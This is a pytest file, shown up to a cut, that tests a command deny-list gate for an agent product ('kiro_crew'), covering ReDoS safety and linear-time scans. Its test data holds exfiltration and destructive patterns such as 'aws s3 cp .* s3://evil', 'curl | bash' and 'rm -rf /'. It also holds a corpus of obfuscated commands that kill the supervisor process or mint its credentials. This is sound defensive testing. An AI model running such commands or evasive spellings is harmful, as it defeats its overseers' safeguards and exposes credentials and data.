"""Tests that the deny walk's cost stays bounded on hostile input.

A user regex that would backtrack catastrophically is refused and never run, every built-in
that reaches the regex tier runs, the self-protection floor's keyword gate lets a benign
command skip the descent, the module-flag and nested-payload scans stay linear in token
count, a polynomial-backtracking regex keeps the bounded engine, and the data-consumer guard
is charged once per command and once per frame rather than once per nested payload or per
trigger token.
"""

from __future__ import annotations

import time

import pytest
from denied_commands_security_helpers import _own_address_probe_stays_local  # noqa: F401
from denied_commands_security_helpers import (
    _NAME,
    _PK,
    _RULE_KILL,
    _RULE_MINT,
    _TOK,
    _denied_by,
    _rule_pattern,
)

from kiro_crew import security
from kiro_crew.security import _GIT_PUBLISH_RULE_PATTERNS, BUILTIN_DENIED_RULES
from kiro_crew.security import argv_floor as _argv_floor
from kiro_crew.security import is_denied, is_safe_user_regex

# Each test starts with the macOS libc and libproc handle caches unbuilt and puts them
# back after, as every test of the test_denied_commands_security family does (see conftest.py).
pytestmark = pytest.mark.usefixtures("fresh_darwin_libc_handles")


class TestUserRegexReDoSGate:
    """A USER-supplied deny regex is arbitrary; a catastrophic-backtracking
    pattern (``(a+)+$`` …) would freeze the synchronous PreToolUse gate on the
    event loop.  ``is_safe_user_regex`` rejects such patterns at the add
    boundary, and ``_DenyMatcher`` refuses to run an already-stored unsafe
    pattern (defense-in-depth).  Built-ins are ReDoS-safe by construction and
    are unaffected by this gate.
    """

    # Load-tolerant ceiling (see TestIsDeniedReDoSResistance): only has to
    # separate linear from catastrophic (seconds-to-minutes), not assert a
    # sub-100ms wall clock on a shared, parallel CI runner.
    _BUDGET_SECONDS = 5.0

    _CATASTROPHIC = (
        "(a+)+$",
        "(x+x+)+y",
        "(.*a){20}",
        "(a|a)*$",
        "(a*)*",
        "(a+)*",
        "([a-z]+)+",
        r"(\w+\s*)+",
        "(a?)*a{20}",
        "(ab|a)+$",
        "((a)*)*",
        "(.+)+z",
        r"(\d+)+",
    )

    _BENIGN = (
        "rm -rf /tmp/mine",
        "aws s3 cp .* s3://evil",
        "get_secret",
        ".*password.*",
        r"curl .* \| bash",
        "delete-stack",
        "(abc)+",
        "a+b+c+",
        r"[a-z]+\.txt",
        r"\d{3}-\d{4}",
        r"(?:aws|gcloud) .*delete",
        "(cat|dog)food",
    )

    def test_is_safe_user_regex_rejects_catastrophic(self):
        for pat in self._CATASTROPHIC:
            assert not is_safe_user_regex(pat), pat

    def test_wrapped_builtin_flag_run_gets_no_user_regex_exemption(self):
        """A USER regex embedding a built-in flag-run fragment verbatim must not
        inherit the built-in scrub: wrapping the fragment in an outer quantifier
        nests its ``*`` and backtracks catastrophically.  Only a COMPLETE
        built-in pattern is exempt."""
        from kiro_crew.security import (
            _DANGEROUS_AWS_FLAG_RUN,
            _LINEARIZED_AWS_FLAG_RUN,
        )

        for fragment in (_DANGEROUS_AWS_FLAG_RUN, _LINEARIZED_AWS_FLAG_RUN):
            assert not is_safe_user_regex("(?:" + fragment + ")+Z")

    def test_is_safe_user_regex_rejects_malformed(self):
        assert not is_safe_user_regex("(unclosed")
        assert not is_safe_user_regex("[a-")

    def test_is_safe_user_regex_rejects_top_level_alternation(self):
        # A top-level alternation can't be fragment-matched full-length and would
        # fall back to a length-bounded scan, so a padded command could slip a
        # needle past the bound. Reject it at add-time (no built-in has one; a
        # user can split it into separate rules).
        assert not is_safe_user_regex("dangerous-tool|other-tool")
        assert not is_safe_user_regex("rm -rf /|dd if=")
        # A nested (grouped) alternation is fine — it isn't top-level.
        assert is_safe_user_regex("aws (ec2|s3) delete")

    def test_is_safe_user_regex_accepts_benign(self):
        for pat in self._BENIGN:
            assert is_safe_user_regex(pat), pat

    def test_every_builtin_reaching_the_regex_tier_is_safe(self):
        # Every built-in that actually reaches ``_DenyMatcher`` must pass the
        # gate.  The 7 git-publish patterns are the sole exception: they are
        # filtered OUT of the regex tier (``_GIT_PUBLISH_RULE_PATTERNS``) and
        # enforced by the always-on verb-anchored ``_is_git_publish`` floor, so
        # their nested quantified-group-with-alternation shape (structurally
        # ReDoS-prone under naive ``re`` — exactly why they are excluded) never
        # runs through the matcher.
        for rule in BUILTIN_DENIED_RULES:
            if rule.pattern in _GIT_PUBLISH_RULE_PATTERNS:
                continue
            assert is_safe_user_regex(rule.pattern), rule.id

    def test_all_builtins_matchable_without_hanging(self):
        # End-to-end: building + running every built-in matcher on a hostile
        # 20k input must stay fast (the git-publish patterns are filtered by
        # is_denied, the rest are linear).
        hostile = "aws " + ("-x " * 5000) + "delete-"
        start = time.perf_counter()
        is_denied(hostile)
        # flake-ok: pre-existing load-tolerant 5 s ceiling that only separates linear from catastrophic matching, moved verbatim; tracked for a de-flake pass
        assert time.perf_counter() - start < self._BUDGET_SECONDS

    def test_catastrophic_user_regex_does_not_freeze_is_denied(self):
        # REQUIREMENT: a stored catastrophic pattern must be skipped, not run —
        # is_denied on a long adversarial input stays far under the budget.
        hostile = "a" * 2000 + "!"
        for pat in self._CATASTROPHIC:
            start = time.perf_counter()
            result = is_denied(hostile, denied_regexes=[pat])
            elapsed = time.perf_counter() - start
            # flake-ok: pre-existing load-tolerant 5 s ceiling that only separates linear from catastrophic matching, moved verbatim; tracked for a de-flake pass
            assert elapsed < self._BUDGET_SECONDS, f"{pat}: {elapsed:.3f}s"
            # Disabled (skipped) — it must not match.
            assert result is None, pat

    def test_catastrophic_pattern_among_builtins_stays_fast_and_covers(self):
        # Defense-in-depth: a catastrophic user pattern stored ALONGSIDE the
        # built-ins is skipped (no freeze) while the built-ins still enforce.
        regexes = ["(a+)+$", *[r.pattern for r in BUILTIN_DENIED_RULES]]
        start = time.perf_counter()
        benign = is_denied("a" * 3000 + "!", denied_regexes=regexes)
        # flake-ok: pre-existing load-tolerant 5 s ceiling that only separates linear from catastrophic matching, moved verbatim; tracked for a de-flake pass
        assert time.perf_counter() - start < self._BUDGET_SECONDS
        assert benign is None
        # A real destructive command is still denied despite the stored junk.
        assert (
            is_denied("aws ec2 terminate-instances --instance-ids i-1", denied_regexes=regexes)
            is not None
        )

    def test_benign_user_regex_still_enforced(self):
        # A safe user pattern must still be accepted AND enforced end-to-end.
        assert is_safe_user_regex("rm -rf /tmp/mine")
        assert is_denied("rm -rf /tmp/mine now", denied_regexes=["rm -rf /tmp/mine"]) is not None
        assert (
            is_denied("aws s3 cp x s3://evil", denied_regexes=[r"aws s3 cp .* s3://evil"])
            is not None
        )


class TestBuiltinRuleMatcherShape:
    """Every built-in that REACHES the regex tier must actually run.

    ``_DenyMatcher`` disables any pattern ``is_safe_user_regex`` rejects, which
    includes a TOP-LEVEL alternation (``a|b``).  A rule authored that way still
    appears in the catalog and still shows in the posture UI, but matches
    nothing — a self-protection rule would look present while enforcing
    zero.  These assertions make that failure mode loud instead of silent.

    The ``git-publish`` patterns are excluded because they are *intentionally*
    never fed to Python ``re``: ``is_denied`` filters them out
    (``_GIT_PUBLISH_RULE_PATTERNS``) and the always-on verb-anchored
    ``_is_git_publish`` floor enforces that category instead.  The exclusion is
    derived from the live frozenset, not a hardcoded id list, so this test
    tracks that design rather than pinning a snapshot of it.
    """

    @staticmethod
    def _regex_tier_rules():
        return [r for r in BUILTIN_DENIED_RULES if r.pattern not in _GIT_PUBLISH_RULE_PATTERNS]

    def test_every_regex_tier_pattern_is_accepted_by_the_safety_gate(self):
        unsafe = [r.id for r in self._regex_tier_rules() if not is_safe_user_regex(r.pattern)]
        assert unsafe == [], f"these built-ins would be DISABLED at runtime: {unsafe}"

    def test_no_regex_tier_matcher_is_disabled(self):
        from kiro_crew.security import _deny_matcher

        disabled = [r.id for r in self._regex_tier_rules() if _deny_matcher(r.pattern)._disabled]
        assert disabled == [], f"these built-ins match nothing: {disabled}"

    def test_narrowed_rules_use_the_full_input_matcher(self):
        # Both rules were narrowed away from ``.*``-gapped co-occurrence, so each
        # reduces to a single fragment matched with exact ``re.search`` over the
        # WHOLE command — not the length-capped bounded scan.
        from kiro_crew.security import _deny_matcher

        for rule_id in (_RULE_KILL, _RULE_MINT):
            matcher = _deny_matcher(_rule_pattern(rule_id))
            assert not matcher._bounded, rule_id
            assert len(matcher._frag_res) == 1, rule_id


class TestSelfFloorShortCircuit:
    """Perf gate for the self-protection floor.

    The floor predicates tokenize the command and descend every nested shell
    payload, which dominates deny-scan cost on complex bash. The gate
    ``_self_floor_can_fire`` skips that descent when firing is provably
    impossible. Ratcheted on STRUCTURE, never timing: (a) a benign command
    performs ZERO descents; (b) every obfuscated spelling the floor denies
    today still passes the gate, so no bypass window opens.
    """

    def _descent_calls(self, monkeypatch, text: str) -> int:
        from kiro_crew import security

        calls = {"n": 0}
        real = security._self_token_frames

        def spy(t: str):
            calls["n"] += 1
            return real(t)

        monkeypatch.setattr(security, "_self_token_frames", spy)
        security._is_credential_mint(text)
        security._is_self_kill(text)
        return calls["n"]

    def test_benign_command_skips_the_descent_entirely(self, monkeypatch):
        # The 95%+ common case: a tool name plus a path. No self name, no
        # shell machinery — the recursive tokenize-and-descend must not run.
        for benign in (
            "fs_read /workplace/user/project/src/main.py",
            "ls -la /tmp/foo",
            "git status",
            "cat notes.txt",
            "npm run build",
        ):
            assert (
                self._descent_calls(monkeypatch, benign) == 0
            ), f"descent ran for benign input: {benign!r}"

    def test_name_carrying_command_still_descends(self, monkeypatch):
        # A real candidate must reach the full structural scan.
        assert self._descent_calls(monkeypatch, "kirocrew token") >= 1
        assert self._descent_calls(monkeypatch, "pkill -f kirocrew") >= 1

    def test_gate_is_a_necessary_condition_not_a_name_grep(self):
        """Every obfuscated spelling the floor denies must pass the gate.

        Gating on a raw ``_SELF_NAME_RE`` search would be UNSOUND — each input below fires a predicate today while its raw text
        never matches ``kiro[-.]?crew``. The gate must answer True for all of
        them (over-matching is safe; under-matching is a bypass).
        """
        from kiro_crew import security

        for evasive in (
            "python -m kiro_crew token",  # underscored module spelling
            "[k]irocrew token",  # one-char bracket class
            "kiro$()crew token",  # empty command substitution
            "kiro${x:-crew} token",  # parameter default
            'bash -c "\\x6birocrew token"',  # printf hex escape
            'k""iro""crew token',  # empty-string concatenation
            "kiro?rew token",  # glob the shell expands before exec
            "kill $(pgrep -f kirocrew)",  # bare kill via substitution
            "python -c \"exec(__import__('base64').b64decode('x'))\" token",
        ):
            assert security._self_floor_can_fire(
                evasive
            ), f"gate would bypass the floor for {evasive!r}"

    def test_gated_predicates_still_deny_the_obfuscation_corpus(self):
        """End-to-end: the predicates (with the gate in front) keep firing."""
        from kiro_crew import security

        for mint in (
            "[k]irocrew token",
            "kiro$()crew token",
            "kiro${x:-crew} token",
            'bash -c "\\x6birocrew token"',
            'k""iro""crew token',
            "kiro?rew token",
        ):
            assert security._is_credential_mint(mint), f"mint not caught: {mint!r}"
        assert security._is_self_kill("kill $(pgrep -f kirocrew)")
        assert security._is_self_kill("pkill -f kirocrew")

    def test_gate_declines_plain_text_without_machinery(self):
        from kiro_crew import security

        for plain in (
            "ls -la /tmp/foo",
            "git status",
            "grep token app.log",
            "cat /workplace/user/notes.txt",
        ):
            assert not security._self_floor_can_fire(plain), f"gate over-triggered on {plain!r}"

    def test_tilde_expansion_still_reaches_the_floor(self, monkeypatch):
        """``pkill -f ~`` IS a self-kill whenever $HOME lies under the product
        tree: the kill predicates expanduser their targets, so the raw text
        carries neither the self name nor any other machinery character.
        ``~`` must therefore be in the machinery class, or the gate opens a
        real bypass.
        """
        from kiro_crew import security

        # expanduser reads HOME on POSIX but USERPROFILE on Windows — set
        # both so the tilde target resolves under the product tree everywhere.
        monkeypatch.setenv("HOME", "/opt/kiro-crew")
        monkeypatch.setenv("USERPROFILE", "/opt/kiro-crew")
        for kill in ("pkill -f ~", "killall ~", "pkill -f ~/"):
            assert security._self_floor_can_fire(kill), f"gate would bypass the floor for {kill!r}"
        # End-to-end: the gated predicate still denies it.
        assert security._is_self_kill("pkill -f ~")

    def test_quote_glued_dynamic_exec_still_reaches_the_floor(self):
        """Empty-quote glue hides the dynamic-exec verb exactly as it hides the
        name.  ``python -c "ex""ec(...)"`` carries no product name, no machinery
        character, and no *raw* ``exec(`` — the tokenizer removes the quotes before
        the payload is read, so the gate must search the dynamic-exec marker on the
        quote-stripped text too, not only on the raw text.  The gate is a perf short-circuit:
        opening it lets the full scan run, it does not decide the verdict.

        The verdict is NOT a mint: this payload names nothing of the product.
        Denying it on the dynamic-exec shape alone is the reading under which every
        inline ``getattr``/``eval``/``importlib`` one-liner is a credential mint,
        and one ``test_the_true_residual_gap_is_a_name_no_matcher_can_see``
        concedes protects nothing, since ``python /tmp/s.py`` reads the same file
        unhindered.
        """
        from kiro_crew import security

        glued = "ex" + '""' + "ec"
        cmd = f'python -c "{glued}(open(chr(47)).read())"'

        # Precondition: none of the other branches can open the gate for this input,
        # so the test genuinely exercises the stripped dynamic-exec branch.
        assert not security._SELF_FLOOR_NAME_HINT_RE.search(cmd)
        assert not security._SELF_FLOOR_MACHINERY_RE.search(cmd)
        assert not security._INLINE_DYNAMIC_EXEC_RE.search(cmd)

        assert security._self_floor_can_fire(
            cmd
        ), "gate would bypass the floor for quote-glued dynamic exec"
        # The full scan runs and finds no mint surface: allowed.
        assert not security._is_credential_mint(cmd)
        assert security.is_denied(cmd) is None
        # The same glue around a payload that DOES name the surface is still denied.
        reach = f"python -c \"{glued}('import kiro_crew.cli')\""
        assert security._is_credential_mint(reach)


class TestSelfModuleIndexIsLinear:
    """The self-protection floor's module-flag scan must stay LINEAR in token count.

    ``_self_module_name_index`` walked forward from an interpreter token to the first
    module flag, normalizing every token it passed.  ``_self_program_index`` called it
    for every python-looking token and ``_matches_self_subcommand`` looped that over all
    tokens, so a command of interpreter words with no module flag among them re-walked
    and re-normalized the whole tail once per word: quadratic, on a floor that runs for
    every command.

    Reaching it needs only one product word anywhere in the text, which is what opens
    the floor's cheap keyword gate (``_self_floor_can_fire``).  Padding alone does NOT
    reproduce it -- ``python ... restart`` leaves that gate shut and the path is linear,
    which is why the shape below carries ``kirocrew``.  Measured on base:
    0.035 s / 0.125 s / 0.490 s / 1.937 s / 7.704 s at 250/500/1000/2000/4000 tokens,
    4x per doubling, against 0.0027 s -> 0.0414 s after -- 186x at 4 000 tokens, and
    the negative-verdict spelling pays the same cost to decide nothing.

    The scan and the normalized forms are computed once per token list.  Both the
    verdicts and the complexity are pinned, since a rewrite that changed which token the
    scan stops at would silently change what the floor denies.
    """

    # Every branch of the scan, with the index it must return for the interpreter at 0.
    SHAPES: "list[tuple[list[str], object]]" = [
        (["python", "-m", "kiro_crew", "restart"], 2),
        (["python", "-mkiro_crew", "restart"], 1),
        # A -m<something-else> is an ordinary interpreter flag: the scan must CONTINUE
        # past it rather than stop, or the real module flag after it is never seen.
        (["python", "-mjson", "-m", "kiro_crew"], 3),
        (["python", "-msomething", "-mkiro_crew"], 2),
        (["python", "-u", "-O", "-m", "kiro_crew"], 4),
        # -m present but the module is not ours, and -m as the final token.
        (["python", "-m", "json"], None),
        (["python", "-m"], None),
        (["python"], None),
        (["python", "-mjson"], None),
        # Quoting and dotted submodules the normalizer resolves.
        (["python", "-m", "'kiro_crew'"], 2),
        (["python", "-m", "kiro_crew.cli"], 2),
    ]

    def test_the_returned_index_is_unchanged(self):
        from kiro_crew import security

        for tokens, expected in self.SHAPES:
            scan = security._self_module_flag_scan(list(tokens))
            assert security._self_module_name_index(list(tokens), 0, scan) == expected, tokens

    def test_a_shared_scan_answers_as_a_fresh_one_does(self):
        """The scan is built once per frame and reused for every token in it, so a
        stale or mismatched table would answer differently from one built for the call.
        Pinned at every interpreter position, since that reuse is the whole optimization.
        """
        from kiro_crew import security

        for tokens, expected in self.SHAPES:
            shared = security._self_module_flag_scan(list(tokens))
            for i in range(len(tokens)):
                fresh = security._self_module_flag_scan(list(tokens))
                assert security._self_module_name_index(
                    list(tokens), i, shared
                ) == security._self_module_name_index(list(tokens), i, fresh), (tokens, i)
            assert security._self_module_name_index(list(tokens), 0, shared) == expected

    def test_the_scan_is_a_required_argument(self):
        """Not optional-with-a-fallback: this is called once per token by a loop over
        those tokens, so a caller able to omit the scan could silently reintroduce the
        quadratic. A type error is the point."""
        import inspect

        from kiro_crew import security

        for fn in (security._self_module_name_index, security._self_program_index):
            param = inspect.signature(fn).parameters["scan"]
            assert param.default is inspect.Parameter.empty, fn.__name__

    def test_the_floor_verdicts_are_unchanged(self):
        from kiro_crew import security

        for text in (
            "kirocrew restart",
            "python -m kiro_crew restart",
            "python -mkiro_crew restart",
            "python -mjson -m kiro_crew restart",
            "python -msomething -m kiro_crew restart",
            "python -u -O -m kiro_crew restart",
            "python -m 'kiro_crew' restart",
            "python -m kiro_crew -v restart",
            "python python -m kiro_crew restart",
        ):
            assert security._is_self_restart(text), text

        for text in (
            "kirocrew doctor",
            "python -m kiro_crew",
            "python restart",
            "python -m pytest test/test_restart.py",
            "echo kirocrew restart",
        ):
            assert not security._is_self_restart(text), text

    def test_the_stop_predicate_matches_the_handling(self):
        from kiro_crew import security

        for token in ("-m", "-mkiro_crew", "-mkiro_crew.cli"):
            assert security._is_self_module_flag(token), token
        # Not a stop: the scan has to keep going past these.
        for token in ("-mjson", "-msomething", "python", "-u", "", "kiro_crew"):
            assert not security._is_self_module_flag(token), token

    def test_the_scan_is_linear_not_quadratic(self, monkeypatch):
        """What makes the scan linear is asserted DETERMINISTICALLY, not by timing.

        A timed doubling ratio cannot separate this property from the runner: on a
        starved shared CI host, scheduler noise, GC pauses, and frequency scaling
        inflate the ratio past any bound tight enough to catch the quadratic (a run
        was observed failing the 3x ratio while the absolute budget below passed
        with 2.1x headroom -- the red measured the runner, not the code), so the
        ratio form false-reds PRs whose diff never touches this scan. The linearity
        is structural, so it is asserted structurally, the same two-layer strategy
        as ``test_mid_dotstar_chain_spam_stays_linear``. A regression has to break
        one of these to reintroduce the quadratic:

          1. PRECOMPUTE ONCE PER FRAME -- ``_self_module_flag_scan`` (the single
             pair of linear passes that replaced the per-interpreter-token re-walk)
             runs exactly once for the frame, however many interpreter tokens the
             frame holds;
          2. WORK PER TOKEN IS CONSTANT -- the ``_normalize_operand`` AND
             ``_is_self_module_flag`` call counts each grow as an exact arithmetic
             progression in the token count (equal size steps produce equal call
             increments). The quadratic this test pins against re-normalized the
             remaining tail once per interpreter token, which makes the increments
             themselves grow with the size and breaks the progression. The flag
             predicate is counted SEPARATELY because a cheaper regression shape
             exists that never re-normalizes: a per-token forward walk over the
             already-precomputed ``scan.norm`` (losing the ``stops`` O(1) jump)
             keeps the normalize count linear, but it must consult the stop
             predicate once per walked token, so that count goes quadratic and
             breaks its progression.

        The absolute budget stays as the machine-independent catastrophic-blowup
        backstop: the pre-fix quadratic spent 1.94s where the bound is 0.5s, and it
        also catches cost added outside the instrumented calls, where the counts
        cannot see it.
        """
        import time

        from kiro_crew import security

        def build(n: int) -> str:
            return " ".join(["python"] * n + ["kirocrew", "restart"])

        # Backstop budget, measured BEFORE instrumenting (the counting wrappers
        # below would bill their own overhead against it). The input is built
        # OUTSIDE the timed window, and one untimed small-size call warms the
        # path first, so first-call cost is not billed against the budget when
        # this test runs alone.
        security._is_self_restart(build(250))
        text = build(2000)
        start = time.perf_counter()
        assert security._is_self_restart(text) is True
        large = time.perf_counter() - start
        # Base spent 1.94 s here; a quadratic scan cannot come near this ceiling.
        # flake-ok: pre-existing 0.5 s backstop on a scan the base spent 1.94 s on; the linearity is pinned by call counts below; moved verbatim, tracked for a de-flake pass
        assert large < 0.5, f"2k tokens took {large:.3f}s"

        real_scan = security._self_module_flag_scan
        real_norm = security._normalize_operand
        real_flag = security._is_self_module_flag
        counts = {"scan": 0, "norm": 0, "flag": 0}

        def counting_scan(tokens: "list[str]") -> "security._SelfModuleScan":
            counts["scan"] += 1
            return real_scan(tokens)

        def counting_norm(token: str) -> str:
            counts["norm"] += 1
            return real_norm(token)

        def counting_flag(tok: str) -> bool:
            counts["flag"] += 1
            return real_flag(tok)

        monkeypatch.setattr(security, "_self_module_flag_scan", counting_scan)
        monkeypatch.setattr(security, "_normalize_operand", counting_norm)
        monkeypatch.setattr(security, "_is_self_module_flag", counting_flag)

        def measured(n: int) -> "tuple[int, int, int]":
            counts["scan"] = counts["norm"] = counts["flag"] = 0
            # The verdict must still be reached THROUGH the instrumented path, or
            # the counts below are counting nothing.
            assert security._is_self_restart(build(n)) is True
            return counts["scan"], counts["norm"], counts["flag"]

        results = [measured(n) for n in (500, 1000, 1500)]

        # (1) The precompute runs once per frame, independent of the token count.
        for scans, _, _ in results:
            assert scans == 1, (
                f"_self_module_flag_scan ran {scans} times for one frame -- a "
                "per-token caller is the quadratic re-walk the precompute removed"
            )

        # (2) Per-token work is constant: equal size steps, equal call increments,
        # for BOTH instrumented costs (see the docstring for why each has teeth).
        for name, series in (
            ("normalize", [norm for _, norm, _ in results]),
            ("module-flag-predicate", [flag for _, _, flag in results]),
        ):
            assert series[0] > 500, (
                f"the instrument is not observing the path under test -- fewer "
                f"{name} calls than tokens means the scan never saw the frame"
            )
            assert series[1] - series[0] == series[2] - series[1], (
                f"{name} counts {series} are not an arithmetic progression -- the "
                "per-token cost grows with the input, which is the super-linear "
                "re-walk this precompute exists to prevent"
            )

    def test_the_padded_shape_that_does_not_open_the_gate_stays_cheap(self):
        """Pins the reason the reported reproduction did not reproduce: without a
        product word the floor's keyword gate stays shut and nothing is scanned."""
        from kiro_crew import security

        assert not security._self_floor_can_fire("python restart")
        assert security._self_floor_can_fire("python kirocrew")


class TestNestedPayloadExtractionIsLinear:
    """``_nested_shell_payloads`` must stay LINEAR in token count.

    It runs inside the synchronous PreToolUse gate, on every command, through the
    self-protection floor (``_self_token_frames``) and the deny tiers.  Both of its
    scans must not walk forward per program token looking for the first command flag,
    so a command padded with interpreter tokens -- none of which is a flag -- made
    every one of them re-walk the whole tail: quadratic, and measured at 13.2 s for
    16 000 tokens, growing ~4x per doubling.  At that size the gateway's own loop
    watchdog fires and the process exits, so this is a denial of service reachable
    from any agent- or injection-authored command.

    Each scan's first-stop index is precomputed in one backward pass.  The
    payload list is unchanged by construction -- the loops' only exits were that
    first stop token or the end of the list -- and both properties are pinned here:
    the SET, so the transformation cannot silently drop or invent a payload, and the
    COMPLEXITY, so a future edit cannot reintroduce a per-program walk.
    """

    # Every shape the extractor recognises, with the payloads it must produce.
    SHAPES: "list[tuple[list[str], list[str]]]" = [
        (["bash"] * 8 + ["-c", "x"], ["x"] * 8),
        (["bash", "-c", "--", "--", "x"], ["x"]),
        # A ``--`` run that reaches the end of the list yields NOTHING: there is no
        # script token after it.  Worth pinning because the scan still has to traverse
        # the run, so this is the shape whose cost buys no payload at all.
        (["$0"] * 3 + ["-c"] + ["--"] * 3, []),
        (["$0"] * 3 + ["-c"] + ["--"] * 3 + ["x"], ["x"] * 3),
        (["bash", "-c", "--", "x", "--", "y"], ["x"]),
        (["bash", "--", "-c", "x"], ["x"]),
        (["bash", "<<<", "x"], ["x"]),
        (["bash", "<<<x"], ["x"]),
        (["bash<<<x"], ["x"]),
        (["env", "-Sx"], ["x"]),
        (["env", "--split-string=x"], ["x"]),
        (["env", "--split-string", "x"], ["x"]),
        (["eval", "x"], ["x"]),
        (["$SHELL", "-c", "x"], ["x"]),
        (["bash", "-c"], []),
        (["bash", "-c", "--"], []),
        (["a=(rm -rf)", "${a[@]}"], ["rm -rf"]),
        ([], []),
    ]

    def test_the_payload_set_is_unchanged(self):
        from kiro_crew import security

        for tokens, expected in self.SHAPES:
            assert security._nested_shell_payloads(list(tokens)) == expected, tokens

    def test_the_scan_is_linear_not_quadratic(self, monkeypatch):
        """What makes the scan linear is asserted DETERMINISTICALLY, not by timing.

        A timed doubling ratio measures the runner, not the code: on a starved
        shared Windows runner, scheduler noise alone produced a 3.1x ratio against
        the 3x bound and false-redded a PR whose diff never touched this scan --
        the same failure mode already evicted from
        ``TestSelfModuleIndexIsLinear::test_the_scan_is_linear_not_quadratic`` and
        ``test_a_chain_of_glued_redirects_is_linear``, whose structural strategy is
        reused here.  A regression has to break one of these to reintroduce the
        quadratic:

          1. PRECOMPUTE ONCE PER CALL -- ``_next_stop_indexes`` runs exactly
             TWICE per call (the env-split stop table and the past-the-dashes
             run-skip table), however many tokens the command holds;
          2. WORK PER TOKEN IS CONSTANT -- the ``_program_basename`` call count
             grows as an exact arithmetic progression in the token count (equal
             size steps produce equal call increments).  The quadratic this test
             pins against re-walked the whole tail once per shell token, which
             makes the increments themselves grow with the size and breaks the
             progression;
          3. NO PER-SHELL-TOKEN RE-WALK -- the ``_is_shell_command_flag`` and
             ``_is_not_double_dash`` call counts each hold to an exact arithmetic
             progression too.  These are the predicates a per-shell-token forward
             re-walk has to re-consult once per walked token, so a regression to
             the quadratic breaks their progressions even where the basename
             count above stays linear.

        One stated residual: a re-walk that INLINES the comparisons instead of
        calling the named predicates is not observed by these counts.  The named
        predicates are the contract that keeps the comparisons callable -- the
        stop-table design exists precisely so every consult goes through them --
        and the timing form this replaces could not reliably catch that shape
        either (the ratio measured the runner, not the code).

        No absolute wall-clock cap: coverage tracing on the backend jobs prices
        line events, not algorithmic cost, and the counts see
        every cost shape this function can otherwise regress to.
        """
        from kiro_crew import security

        real_stop_tables = security._next_stop_indexes
        real_basename = security._program_basename
        real_flag = security._is_shell_command_flag
        real_dash = security._is_not_double_dash
        counts = {"tables": 0, "basename": 0, "flag": 0, "dash": 0}

        def counting_stop_tables(tokens: "list[str]", is_stop: object) -> "list[int]":
            counts["tables"] += 1
            return real_stop_tables(tokens, is_stop)  # type: ignore[arg-type]

        def counting_basename(token: str) -> str:
            counts["basename"] += 1
            return real_basename(token)

        def counting_flag(token: str) -> bool:
            counts["flag"] += 1
            return real_flag(token)

        def counting_dash(token: str) -> bool:
            counts["dash"] += 1
            return real_dash(token)

        monkeypatch.setattr(security, "_next_stop_indexes", counting_stop_tables)
        monkeypatch.setattr(security, "_program_basename", counting_basename)
        monkeypatch.setattr(security, "_is_shell_command_flag", counting_flag)
        monkeypatch.setattr(security, "_is_not_double_dash", counting_dash)

        def measured(n: int) -> "tuple[int, int, int, int]":
            counts["tables"] = counts["basename"] = 0
            counts["flag"] = counts["dash"] = 0
            # The verdict must still be reached THROUGH the instrumented path, or
            # the counts below are counting nothing.  The padding token is
            # dash-prefixed so the flag predicate is genuinely consulted (a
            # dash-free padding never reaches it and its progression would hold
            # vacuously), but ``-x`` is not a command flag, herestring, or glued
            # carrier, so the shape still yields no payload -- all cost, no
            # output, the padding shape from the report.
            assert security._nested_shell_payloads(["bash", "-x"] * (n // 2)) == []
            return (
                counts["tables"],
                counts["basename"],
                counts["flag"],
                counts["dash"],
            )

        sizes = (2000, 4000, 6000)
        results = [measured(n) for n in sizes]

        # (1) The stop tables are built once per call, independent of size.
        for tables, _, _, _ in results:
            assert tables == 2, (
                f"_next_stop_indexes ran {tables} times for one call -- the env "
                "stop table and the past-the-dashes table are each built exactly "
                "once; a per-token builder is the re-walk the precompute removed"
            )

        # (2) + (3) Per-token work is constant: equal size steps, equal call
        # increments, for every instrumented cost (see the docstring for why each
        # has teeth).  The progression form (rather than exact doubling) is
        # deliberately immune to a constant per-call offset, so a benign refactor
        # that adds one probe call does not false-red this test.
        for name, floor, series in (
            ("program-basename", sizes[0], [b for _, b, _, _ in results]),
            ("command-flag-predicate", sizes[0] // 2, [f for _, _, f, _ in results]),
            ("double-dash-predicate", sizes[0], [d for _, _, _, d in results]),
        ):
            assert series[0] >= floor, (
                f"the instrument is not observing the path under test -- fewer "
                f"{name} calls than expected means the scan never saw the tokens"
            )
            assert series[1] - series[0] == series[2] - series[1], (
                f"{name} counts {series} are not an arithmetic progression -- the "
                "per-token cost grows with the input, which is the super-linear "
                "re-walk this precompute exists to prevent"
            )

    def test_a_long_double_dash_run_is_also_linear(self, monkeypatch):
        """The ``--`` skip after a command flag was a THIRD forward walk, and fixing
        the two scans did not fix it: every program token found the same flag and
        then re-walked the whole run, so ``$0 ... -c -- -- ...`` stayed quadratic
        (measured 4x per doubling) even with the scans linear.

        Asserted DETERMINISTICALLY, not by timing (see
        ``test_the_scan_is_linear_not_quadratic`` for the observed false-red).
        The fixed code prices the ``--`` run ONCE, while it builds the
        past-the-dashes table; the payload lookups after that are O(1) reads of
        it.  A regression has to break one of these:

          1. ``_next_stop_indexes`` runs exactly TWICE per call, however long
             the run -- a rebuilt or per-program table breaks the constant;
          2. the ``_is_not_double_dash`` call count grows as an exact arithmetic
             progression in n -- the predicate is consulted once per token while
             the table is built, but the third forward walk consulted it once
             per run token PER program token, which makes the increments grow
             with n and breaks the progression.

        One stated residual, shared with ``test_the_scan_is_linear_not_quadratic``:
        a re-walk that inlines the ``--`` comparison instead of calling the named
        predicate is not observed by the count; the named predicate is the
        contract that keeps the comparison callable.

        No absolute wall-clock cap: coverage tracing on the backend jobs prices
        line events, not algorithmic cost; the counts are the
        guard.
        """
        from kiro_crew import security

        real_stop_tables = security._next_stop_indexes
        real_dash = security._is_not_double_dash
        counts = {"tables": 0, "dash": 0}

        def counting_stop_tables(tokens: "list[str]", is_stop: object) -> "list[int]":
            counts["tables"] += 1
            return real_stop_tables(tokens, is_stop)  # type: ignore[arg-type]

        def counting_dash(token: str) -> bool:
            counts["dash"] += 1
            return real_dash(token)

        monkeypatch.setattr(security, "_next_stop_indexes", counting_stop_tables)
        monkeypatch.setattr(security, "_is_not_double_dash", counting_dash)

        def measured(n: int) -> "tuple[int, int]":
            counts["tables"] = counts["dash"] = 0
            # A ``--`` run that reaches the end of the list yields NOTHING
            # (pinned in SHAPES): the whole traversal buys no payload, which is
            # exactly the shape whose cost must not scale per program token.
            tokens = ["$0"] * n + ["-c"] + ["--"] * n
            assert security._nested_shell_payloads(tokens) == []
            return counts["tables"], counts["dash"]

        sizes = (2000, 4000, 6000)
        results = [measured(n) for n in sizes]

        for tables, _ in results:
